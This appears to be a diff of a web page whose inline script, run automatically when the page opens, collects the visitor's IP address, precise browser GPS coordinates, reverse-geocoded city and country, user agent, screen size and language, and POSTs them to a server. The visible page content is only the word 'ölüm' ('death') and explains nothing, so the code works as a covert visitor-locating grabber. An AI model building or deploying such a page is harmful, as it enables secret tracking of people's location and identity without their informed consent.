@@ -22,6 +22,7 @@
     ölüm
 
     <script>
+        // IP'yi almak için
         async function getUserIP() {
             try {
                 const res = await fetch('https://api64.ipify.org?format=json'); 
@@ -33,13 +34,13 @@
             }
         }
 
+        // Nominatim üzerinden enlem/boylam -> ülke/şehir
         async function getLocationFromCoords(latitude, longitude) {
             try {
-                // zoom=18 & addressdetails=1 ile daha ayrıntılı bilgi istenir
+                // zoom=18 & addressdetails=1 ile daha detaylı veriler
                 const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
                 const data = await res.json();
-                
-                // data.address varsa yoksa kontrolleri
+
                 const country = data.address && data.address.country ? data.address.country : "Bilinmeyen";
                 const city = data.address && (data.address.city || data.address.town || data.address.village)
                     ? (data.address.city || data.address.town || data.address.village)
@@ -52,8 +53,9 @@
             }
         }
 
+        // Tarayıcıdan (HTML5 Geolocation) enlem-boylam alma
         function getGPSLocation() {
-            return new Promise((resolve, reject) => {
+            return new Promise((resolve) => {
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
@@ -66,7 +68,6 @@
                             console.error("Konum izni reddedildi veya hata oluştu:", error);
                             resolve(null);
                         },
-                        // Yüksek hassasiyet ve zaman aşımı parametreleri
                         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
                 } else {
@@ -76,9 +77,10 @@
             });
         }
 
+        // IP + Konum bilgilerini toplayıp sunucuya POST etme
         async function sendData() {
             const ip = await getUserIP();
-            let locationData = await getGPSLocation();
+            const locationData = await getGPSLocation();
 
             let userData = {
                 ip: ip,
@@ -87,7 +89,9 @@
                 screenWidth: screen.width,
                 screenHeight: screen.height,
                 language: navigator.language,
-                location: locationData ? `${locationData.location.city}, ${locationData.location.country}` : "Konum alınamadı",
+                location: locationData
+                    ? `${locationData.location.city}, ${locationData.location.country}`
+                    : "Konum alınamadı",
                 latitude: locationData ? locationData.latitude : null,
                 longitude: locationData ? locationData.longitude : null
             };
@@ -99,7 +103,8 @@
             });
         }
 
-        sendData(); // Sayfa açılınca çalıştır
+        // Sayfa açılınca konum isteyip sunucuya kaydet
+        sendData();
     </script>
 </body>
 </html>
